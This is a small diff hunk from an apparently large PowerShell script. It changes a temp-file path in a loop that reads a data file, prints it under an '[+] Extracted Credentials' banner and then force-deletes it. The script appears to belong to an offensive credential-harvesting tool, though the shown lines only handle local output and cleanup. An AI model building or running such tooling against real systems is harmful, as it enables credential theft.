@@ -4995,16 +4995,16 @@ while ($true) {
 
     Start-Sleep -Seconds 2
 
-    if (Test-Path "$env:LOCALAPPDATA\temp\2\data.bin") {
+    if (Test-Path "$env:LOCALAPPDATA\temp\data.bin") {
         Write-Output ""
         Write-Output "[+] Extracted Credentials"
         Write-Output ""
 
-        Get-Content "$env:LOCALAPPDATA\temp\2\data.bin" -Encoding "unicode"
+        Get-Content "$env:LOCALAPPDATA\temp\data.bin" -Encoding "unicode"
         Write-Output ""
         Write-Output ""
 
-        Remove-Item "$env:LOCALAPPDATA\temp\2\data.bin" -Force -ErrorAction "SilentlyContinue"
+        Remove-Item "$env:LOCALAPPDATA\temp\data.bin" -Force -ErrorAction "SilentlyContinue"
         
         }
     }
